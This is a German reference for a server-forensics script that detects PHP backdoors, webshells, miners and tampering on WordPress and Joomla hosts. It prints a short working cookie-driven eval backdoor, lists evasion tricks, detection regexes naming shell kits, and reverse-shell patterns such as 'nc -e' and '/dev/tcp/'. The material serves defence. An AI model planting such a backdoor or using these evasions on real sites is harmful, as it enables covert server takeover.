# NT-Forensik — Erkennungs-Referenz

Technische Details, wie `wp_plesk_forensik.sh` Schadcode erkennt, und warum die Heuristiken so gewählt sind. Für Techniker, die Funde bewerten oder die Erkennung anpassen wollen.

> Alle Beispiele sind fiktiv/generisch.

---

## 1. Obfuskierte Cookie-Backdoors

Die schwierigste Klasse — und der Grund für dieses Tool. Eine typische Datei (190–280 Byte):

```php
<?php $x='C'; $m='_'; $s='OOKIE'; $c=${$m.$x.$s};
if(isset($c['a1B2c3'])){ EvaL(base64_decode($c['a1B2c3'])); }
```

Warum Standardscanner das übersehen:

| Evasion | Wirkung | Gegenmaßnahme im Tool |
|---|---|---|
| **Variable-Variable-Superglobal** `${$m.$x.$s}` | `$_COOKIE` steht nirgends wörtlich im Code | Regex auf `\$\{\s*\$var(\s*\.\s*\$var)+\s*\}` |
| **Mixed-case** `EvaL`, `evAl`, `EVaL` | umgeht `eval(`-Signaturen | Suche case-insensitive (`grep -iP`) |
| **Payload im Cookie** | taucht nicht in URL/Access-Logs auf | Datei-Inhalts-Scan statt Log-Scan |
| **Harmlose Namen** `social-icon.php` | Namensfilter greift nicht | Inhalts-Signatur, nicht Dateiname |

### Die Detektions-Signatur

Kern-Regex (vereinfacht), case-insensitive über alle `*.php`:

```
${$a.$b…}                                  # Variable-Variable-Superglobal
| eval\s*\(\s*(base64_decode|gzinflate|gzuncompress|str_rot13)
| eval\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|SERVER)
| assert\s*\(\s*\$_
| create_function\s*\(\s*'…'\s*,\s*\$      # Dropper-Form
| preg_replace\s*\(\s*'…/e…'              # /e-Modifier (RCE)
| FilesMan | c99sh | r57shell | b374k      # bekannte Shell-Kits
```

`move_uploaded_file($_FILES)` ist **bewusst kein** Muster — es matcht jeden legitimen Upload-Handler.

## 2. Zweistufige Bewertung (Größenschwelle)

Das Problem: `eval(base64_decode(...))` und Variable-Variablen kommen auch in **legitimen** Frameworks vor (z. B. Krypto-Bibliotheken, alte Template-Engines). Die Unterscheidung gelingt über die **Dateigröße**:

| Tier | Bedingung | Einstufung |
|---|---|---|
| **Dropper** | Signatur **und** Datei < 3000 Byte | 🔴 kritisch |
| **Review** | Signatur, aber Datei ≥ 3000 Byte | ⚠️ manuell prüfen |

**Begründung:** Ein Dropper ist fast nur Obfuskation → winzig. Legitimer `eval`-Code steckt eingebettet in großen Dateien (viel Drumherum). In der Praxis trennt das die echten Backdoors (200–300 B) sauber von Framework-Fundstellen (10–50 kB).

Beide Tiers landen im Bericht (mit Größe, mtime, SHA256, Treffer-Vorschau), aber nur Tier 1 ist kritisch. Der Dropper-Cluster wird nach Domain gruppiert, damit die betroffene Site sofort sichtbar ist.

## 3. False-Positive-Filter

Ohne Filter erzeugt Forensik auf gewachsenen Servern viel Rauschen. Bewusst herausgefiltert:

| Fund | Warum gutartig | Filter |
|---|---|---|
| `uploads/**/index.php` (27 B, „Silence is golden") | WP-/Plugin-Guard gegen Directory-Listing | Größe < 200 B + Inhaltsmuster |
| `avia_fonts/*charmap.php`, `avia_icon_fonts/*` | Enfold-Theme-Iconfont-Maps | Pfad-Whitelist |
| `borlabs-cookie/*`, `backwpup/*/index.php` | Plugin-Guards | Pfad-Whitelist |
| WP-`ABSPATH`-geschützte Config-PHP | Standard-WP-Konvention | `ABSPATH` in ersten 120 B + < 2 kB |
| `python3.10 (deleted)` als Prozess-exe | apt-Upgrade-Rest, kein Rootkit | Ziel auf `/usr/bin`, `/lib`, … = gutartig |
| `plesk-ssh-terminal`-Keys bei Web-Usern | Plesk-Browser-Terminal | Key-Kommentar-Whitelist |
| Plugin-Klassen wie `class.u.shell.php`, `*-bypass.php` | legitime Plugin-Dateinamen | Dateinamen-Check nur als ⚠️, Core/vendor/cache ausgeschlossen |
| Joomla: `images/index.php`, `cache/index.php` | Joomlas eigene Schutzdateien gegen Directory-Listing | Größe + `_JEXEC`/`Restricted access` im Inhalt |
| Joomla: Dateien in `cache/`, `administrator/cache/` | **Joomlas Zwischenspeicher besteht aus `.php`-Dateien** (`<?php die("Access Denied"); ?>#x#` + Daten). Der Datenteil ist beliebig groß, ein Größen-Guard greift nicht — auf einem realen Shop 3551 Fehlalarme | genau dieses Präfix ausschließen |
| Joomla: `api/components/`, `api/language/` | Erweiterungen und Sprachpakete installieren dort **regulär** (Akeeba Backup, de-DE-Paket) | von der Kernfremd-Prüfung ausgenommen |
| Joomla: `tmp_path`/`log_path` unterhalb des Webverzeichnisses | **Joomlas Werkseinstellung** — ein Test darauf allein feuert auf 100 % aller Installationen | zusätzlich muss eine schützende `.htaccess`/`web.config` fehlen |
| Joomla: 20–40 aktive System-Plugins | normaler Bestand einer gepflegten Seite (Akeeba, RSFirewall, Regular Labs …) | kein Befund an sich; nur bei fehlendem Verzeichnis, Schadcode darin oder fehlendem Installationspaket |
| Joomla: leeres `manifest_cache` | Joomlas `base.sql` liefert die Kern-Erweiterungen selbst mit leerem Feld aus — auf einer Neuinstallation ist es flächendeckend leer | Indikator gilt nur relativ zur selben Installation: erst wenn die Mehrheit ein Manifest hat, ist eine leere Zeile eine Abweichung |
| Joomla: `<script>`/`<iframe>` in Modulen | „Eigenes HTML" ist genau das Werkzeug für Analyse- und Marketing-Codes | zusätzlich Verschleierungs- oder Versteckmerkmal nötig |
| Joomla: Einträge in `#__user_keys` | „Angemeldet bleiben" ist ein Kernfeature | Befund nur, wenn das zugehörige Plugin abgeschaltet ist |
| Joomla: Abruf von `/api/index.php/v1/…` im Protokoll | Überwachungswerkzeuge rufen den Endpunkt regelmäßig ab und erhalten 401 | nur Antwortcode 200 auf genau dem Konfigurations-Endpunkt zählt |

**Grundsatz:** Lieber gezielt whitelisten als Signaturen aufweichen — die Erkennung bleibt scharf, das Rauschen sinkt.

## 4. Prozess-Forensik (§8.2)

| Prüfung | Kritisch, wenn |
|---|---|
| Miner-Namen | `xmrig`, `kinsing`, `kdevtmpfsi`, `stratum+tcp`, … im Prozess |
| Gelöschtes Binary | `/proc/*/exe → (deleted)` **und** Ziel **nicht** auf Systempfad (`/usr`, `/lib`, `/opt/plesk`, …) |
| Herkunft | exe läuft aus `/tmp`, `/var/tmp`, `/dev/shm` oder Webspace |
| Reverse-Shell | `bash -i`, `nc -e`, `/dev/tcp/`, socket-One-Liner in der Kommandozeile |

Der Systempfad-Filter beim gelöschten Binary ist entscheidend: Nach jedem `apt upgrade` laufen Alt-Prozesse legitim mit `(deleted)` weiter — nur ein gelöschtes Binary auf ungewöhnlichem Pfad ist ein Malware-Indikator.

## 5. Root-Verdikt (§13)

Konsolidiert mehrere Signale zu einer Aussage. Flags, die ein 🔴 auslösen:

- Bekannte **Web-Angreifer-IP** taucht unter erfolgreichen **Root-Logins** auf.
- **Fremde SSH-Keys** (nicht Plesk-Terminal, nicht Admin) bei Root oder Web-Usern.
- **sudo/su-Eskalation** durch Web-/Systemnutzer in den Auth-Logs.
- **Manipulierte System-Binaries** (`dpkg -V` meldet MD5-Mismatch bei bash/ssh/curl/cron).

Null Flags → 🟢 „auf Web-User-Ebene begrenzt". Das ist der forensisch wertvolle Kern: Er trennt einen **Website-Einbruch** (eine Domain neu aufsetzen) von einer **Server-Übernahme** (alles neu).

Zusätzlich als ⚠️ (kein Flag, aber Härtungshinweis): Root-Login per Passwort aktiv, `authorized_keys` kürzlich geändert.

## 6. WordPress-DB-Prüfung (§11)

Read-only-SELECTs gegen jede gefundene WP-DB (Zugang aus `wp-config.php`, bevorzugt Plesk-Admin-MySQL):

| Prüfung | 🔴-Kriterium |
|---|---|
| Admin-Konten | Auflistung; **kürzlich registrierte** Admins (< 30 Tage) = kritisch |
| Optionen | `option_value` mit `base64_decode`/`eval(` oder `auto_prepend`/`auto_append` |
| `siteurl`/`home` | Abweichung vom Domainnamen (Hinweis, Redirect-Hijack) |
| aktive Plugins | Datei-Manager (`fileorganizer`, `wp-file-manager`) = ⚠️ Vektor |

Ein heimlich angelegtes Admin-Konto ist die häufigste WordPress-Persistenz — es überlebt jede Datei-Bereinigung.

## 7. Joomla-Prüfung (§12)

### 7.1 Warum eine eigene Prüfung nötig ist

Der Signatur-Scan aus §7 findet Webshells — er findet aber nicht, wenn eine Installation *angreifbar* ist oder wenn die Nutzlast überhaupt nicht als Datei existiert. Beides ist bei Joomla der Normalfall:

- **Joomla 3 und 4 sind beide ohne Sicherheitspatches** (seit 08/2023 bzw. 10/2025). Advisories aus 2026 nennen weiterhin 3.x als betroffen, ohne dass auf irgendeinem Kanal ein Fix existiert. Eine solche Installation ist nicht „veraltet", sondern dauerhaft angreifbar — das ist ein Befund an sich, auch ohne einen einzigen Schadcode-Fund.
- **Persistenz ohne Datei.** Ein Eintrag in `#__extensions` mit `folder='system'` lädt bei jedem Seitenaufruf Code — noch vor dem Routing und vor jeder Rechteprüfung. Und die Helix3-Kampagne (2026) legt ihre Nutzlast ausschließlich in `#__template_styles.params` ab: ein reiner Dateiscan meldet eine verunstaltete Seite als sauber, und eine Wiederherstellung der Dateien beseitigt nichts.

### 7.2 Versionsbestimmung — vier Zeugen

| Quelle | Gilt für |
|---|---|
| `administrator/manifests/files/joomla.xml` → `<version>` | alle |
| `libraries/src/Version.php` → `MAJOR_/MINOR_/PATCH_VERSION` | 3.8+ / 4 / 5 / 6 |
| `libraries/cms/version/version.php` → `RELEASE`+`DEV_LEVEL` | nur 3.0–3.7 (**in 3.8.0 gelöscht**) |
| `#__extensions` mit `type='file' AND element='joomla'` | Datenbank-Gegenprobe |

Zwei Fallstricke, beide gegen echte Pakete geprüft: Das `version="3.6"`-**Attribut** am `<extension>`-Tag ist die Manifest-Schemaversion, nicht die CMS-Version. Und `type='file'` in der Datenbankabfrage ist Pflicht — es gibt auch eine `type='library'`-Zeile mit demselben `element`.

**Widersprechen sich die Quellen, ist das selbst ein Befund:** unterschiedliche Haupt-/Nebenversion = 🔴 (Manipulation oder abgebrochene Migration), nur unterschiedlicher Patchstand = ⚠️ (unvollständiges Update oder Restore).

### 7.3 Kern-Integrität (§12.5)

Joomla veröffentlicht keine Prüfsummen je Datei — es gibt kein Gegenstück zu `wp core verify-checksums`. NT-Forensik erzeugt sie deshalb selbst aus den offiziellen Paketen (`werkzeuge/joomla-daten-update.sh --coresums`).

**Zweistufiger Vergleich.** Passt der Hash nicht, wird ein zweiter über den auf einfache Leerzeichen normalisierten Inhalt gerechnet. Stimmt der, war es nur eine Änderung an Zeilenenden, Tabs oder angehängten Leerzeichen — typisch nach einer Übertragung per FTP oder einer Bearbeitung unter Windows. Solche Fälle werden gezählt und ausgewiesen, aber **nicht gewertet**. Der zweite Hash wird nur bei Abweichung berechnet und ist deshalb praktisch kostenlos: über 99 % passen schon roh.

**Ein Manifest je Zweig, nicht je Fassung.** Gemessen sind 93 % der Dateien über die Patch-Releases eines Zweigs identisch. Drei Fassungen kombiniert kosten 860 KB statt 2408 KB einzeln; der gesamte Bestand über elf Fassungen liegt bei 3 MB.

**Kernfremde Dateien** werden nur in Verzeichnissen gemeldet, die ausschließlich Joomla-Programmcode enthalten dürfen: `includes/`, `administrator/includes/`, `libraries/src/`, `libraries/vendor/`, `api/`, `cli/`, `layouts/`. In `components/`, `modules/`, `plugins/`, `templates/`, `language/` und `media/` liegen legitim Dritt-Erweiterungen — dort wäre jede Meldung Rauschen.

Nie verglichen wird, was der Betreiber selbst pflegt oder was zur Laufzeit entsteht: `configuration.php`, `.htaccess`, `web.config`, `.user.ini`, `robots.txt`, `cache/`, `tmp/`, `logs/`, `images/`.

Fehlt die Fassung im mitgelieferten Bestand, meldet der Lauf das offen und prüft **nicht** stillschweigend gegen etwas Ähnliches. Mit `--online` lädt er das offizielle Paket der tatsächlich gefundenen Fassung nach (rund 30 MB) und protokolliert den Abruf.

Bewusste Abweichungen — etwa ein selbst eingespielter Notfall-Patch — trägt der Betreiber in `coresums/ausnahmen.tsv` ein, **zusammen mit der erwarteten Prüfsumme**. Ohne den Hash wäre der Eintrag ein Blankoscheck: wer die Datei später austauscht, bliebe unentdeckt.

### 7.4 Datenbank (§12.6)

| Prüfung | 🔴-Kriterium |
|---|---|
| System-Plugins | Verzeichnis fehlt, Schadcode darin, oder Installationspaket fehlt **während alle anderen eines haben** |
| Super-User | freigeschaltet **und** nicht gesperrt **und** nie angemeldet **und** frisch angelegt — alle vier zugleich |
| Passwörter | MD5-Format oder leer auf einem aktiven Super-User |
| Rechtetabelle | Verwaltungsrechte an Gruppe „Öffentlich"/„Registriert" |
| Sitzungstabelle | bekannte Deserialisierungs-Ketten (`JDatabaseDriverMysqli`, `JSimplepieFactory`, `disconnectHandlers`) |
| Vorlagen-Parameter | Skriptcode in `#__template_styles.params` |
| Module | Verschleierung **und** Versteckmerkmal zugleich |
| Anmelde-Token | Einträge vorhanden, obwohl „Angemeldet bleiben" abgeschaltet ist |

Super-User werden **nicht** über die Standardgruppe 8 bestimmt, sondern über die Rechtetabelle des Wurzel-Assets samt Untergruppen — Joomla erlaubt weitere Gruppen mit Verwaltungsrecht, und Kindgruppen erben es.

### 7.5 Schaddateien (§12.8)

Die tragfähigste Regel: **Bild-Kennung in den ersten vier Bytes einer Datei, die der Webserver als PHP ausführt.** Genau so sehen die über die JCE- und Medien-Uploadlücken abgelegten Hintertüren aus — die Bild-Kennung bringt sie an der Upload-Prüfung vorbei. Einen legitimen Fall dafür gibt es nicht.

Dazu: PHP in Medien-/Zwischenspeicher-Ordnern (Guard-gefiltert), gemischte Schreibweise der Endung (`.pHp`) als reine Filterumgehung, ausführbarer Code **vor** der `_JEXEC`-Zugriffssperre, verbliebenes `installation/`-Verzeichnis, `auto_prepend_file`, Sicherungsarchive im Webverzeichnis.

### 7.6 Protokolle (§12.9) — Versuch ist nicht Erfolg

Ein Protokolleintrag belegt, dass jemand einen bekannten Angriffsweg *ausprobiert* hat. Das ist auf einem öffentlich erreichbaren Server Alltag. Der Befund ist deshalb bewusst nur ⚠️ und zählt **nicht** ins Verdikt — kritisch wird er erst zusammen mit einem Dateifund an derselben Installation. Dieselbe Trennung gilt beim Konfigurations-Endpunkt: nur ein Antwortcode 200 belegt einen Abfluss, 401 ist legitime Überwachung.

## 8. Grenzen

- **Kommerzielle Plugins sind nicht auf Unversehrtheit prüfbar.** Für sie
  veröffentlicht niemand Prüfsummen — wordpress.org deckt nur das
  Verzeichnis ab, und es gibt keine brauchbare Fremdquelle (geprüft:
  WPHashes deckt Premium nicht ab und verlangt für kommerzielle Nutzung eine
  Lizenzverhandlung, wpessentials drosselt auf 25–75 Abfragen/Stunde, das
  WP-CLI-Projekt für kommerzielle Anbieter blieb im Versuchsstadium).

  Ausgerechnet diese Plugins sind die lautesten Fundorte des fremden
  Regelsatzes (§13c) — UpdraftPlus, WP All Import Pro, Wordfence. Der
  Rauschfilter dort erreicht sie nicht, und §7.15 kann sie nur belasten, nie
  entlasten.

  **Was das heisst:** eine veränderte Datei eines kommerziellen Plugins wird
  gefunden, wenn der eingeschleuste Code sich verrät — durch Verschleierung,
  eine enorme Zeile, Anhang hinter dem letzten Tag. Wer sauberen,
  umbrochenen Code mitten in eine grosse Datei schreibt, bleibt unsichtbar.
  Siehe Issue #30.

- **§7.15 ist ein Mass, kein Befund.** Seine Schwellen stammen aus den Fällen
  des Selbsttests, nicht aus einer Messung an einem echten Server. Bis die
  vorliegt, meldet der Abschnitt `info` und liefert eine Rangfolge für die
  Sichtung — keine Aussage über Schuld.

- **Keine Garantie auf Vollständigkeit.** Neue Obfuskationsvarianten können der Signatur entgehen.
- **Log-Reichweite** begrenzt die Zeitachse — sehr alte Erstinfektionen liegen evtl. außerhalb der rotierten Logs (Datei-Zeitstempel helfen).
- **Verschlüsselte/gestagte Payloads**, die erst zur Laufzeit nachladen, sind statisch schwer zu fassen.
- Der Dateinamen-Check (§7.5) ist bewusst nur eine ⚠️ — er ist namensbasiert und rauschanfällig.

Deshalb gilt: Das Tool **beschleunigt und dokumentiert** die Forensik, ersetzt aber nicht das geschulte Auge bei der Bewertung.

---
*netztaucher | digital*
